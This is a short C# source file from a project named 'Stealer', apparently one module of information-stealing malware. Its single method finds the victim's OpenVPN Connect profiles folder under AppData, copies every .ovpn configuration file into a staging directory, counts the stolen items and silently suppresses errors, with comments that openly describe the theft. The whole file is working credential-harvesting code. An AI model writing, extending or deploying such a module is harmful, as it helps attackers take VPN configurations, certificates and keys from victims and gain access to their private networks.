using System;
using System.IO;

namespace Stealer
{
    internal sealed class OpenVPN
    {
        // Save("OpenVPN");
        public static void Save(string sSavePath)
        {
            // "OpenVPN connect" directory path
            string vpn = Path.Combine(Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData), "OpenVPN Connect\\profiles");
            // Stop if not exists
            if (!Directory.Exists(vpn))
                return;
            try
            {
                // Create directory to save profiles
                Directory.CreateDirectory(sSavePath + "\\profiles");
                // Steal .ovpn files
                foreach (string file in Directory.GetFiles(vpn))
                    if (Path.GetExtension(file).Contains("ovpn"))
                    {
                        Counter.VPN++;
                        File.Copy(file,
                            Path.Combine(sSavePath, "profiles\\"
                            + Path.GetFileName(file)));
                    }
            }
            catch { }
        }
    }
}
